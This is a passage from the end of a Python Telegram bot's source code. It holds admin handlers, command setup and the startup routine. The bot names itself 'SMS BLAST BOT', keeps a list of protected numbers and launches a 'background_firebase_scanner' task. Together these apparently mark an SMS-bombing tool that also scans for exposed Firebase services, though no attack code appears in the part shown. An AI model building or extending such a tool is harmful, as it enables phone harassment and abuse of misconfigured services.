        f"{em(EMOJI_FIRE, '🔥')} <b>Firebase Manager</b>",
        reply_markup=fb_menu_kb(d),
        parse_mode="HTML",
    )

@R.message(F.text == "📢 Broadcast")
async def txt_broadcast(msg: Message, state: FSMContext):
    d = load()
    if not is_admin(msg.from_user.id, d):
        return
    await state.set_state(S.broadcast)
    await msg.answer(f"{em(EMOJI_BELL, '📢')} Broadcast message bhejo:", parse_mode="HTML")

@R.message(F.text == "📊 Stats")
async def txt_stats(msg: Message, state: FSMContext):
    d = load()
    if not is_admin(msg.from_user.id, d):
        return
    await msg.answer(api_stats_text(d), parse_mode="HTML")

# ═══════════════════════════════════════════════════════════════
#                    NOOP HANDLER
# ═══════════════════════════════════════════════════════════════

@R.callback_query(F.data == "noop")
async def noop(cq: CallbackQuery):
    await cq.answer()

# ═══════════════════════════════════════════════════════════════
#                    MAIN FUNCTION
# ═══════════════════════════════════════════════════════════════

async def set_bot_commands(bot: Bot):
    try:
        await bot.set_my_commands([
            BotCommand(command="start", description="🏠 Main Menu"),
        ], scope=BotCommandScopeDefault())
        await bot.set_my_commands([
            BotCommand(command="start", description="👑 Owner Panel"),
        ], scope=BotCommandScopeChat(chat_id=MAIN_OWNER))
        log.info("Bot commands set ✓")
    except Exception as e:
        log.warning(f"Commands setup: {e}")

async def main():
    log.info("=" * 55)
    log.info(f"  SMS BLAST BOT {_VERSION} — STARTING")
    log.info("=" * 55)

    if not BOT_TOKEN:
        log.error("BOT_TOKEN missing!")
        return

    bot = Bot(token=BOT_TOKEN)
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(R)

    d = load()
    PROTECTED_NUMBERS.update(d.get("protected_numbers", {}))

    try:
        me = await bot.get_me()
        log.info(f"Bot: @{me.username} | ID: {me.id}")
    except Exception as e:
        log.error(f"Bot auth failed: {e}")
        return

    await set_bot_commands(bot)

    try:
        await bot.send_message(
            MAIN_OWNER,
            f"{em(EMOJI_ROCKET, '🚀')} <b>Bot Started!</b>\n\n"
            f"{em(EMOJI_STAR, '📌')} Version: {_VERSION}\n"
            f"{em(EMOJI_GEAR, '⚙️')} Scanner: Starting...",
            parse_mode="HTML",
        )
    except:
        pass

    asyncio.create_task(background_firebase_scanner(bot))

    log.info("Starting polling...")
    try:
        await dp.start_polling(
            bot,
            allowed_updates=["message", "callback_query", "chat_member"],
        )
    except KeyboardInterrupt:
        log.info("Stopped by user")
    finally:
        await bot.session.close()

# ═══════════════════════════════════════════════════════════════
#                    ENTRY POINT
# ═══════════════════════════════════════════════════════════════

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        log.info("Bot shut down ✓")
    except Exception as e:
        log.error(f"Fatal error: {e}", exc_info=True)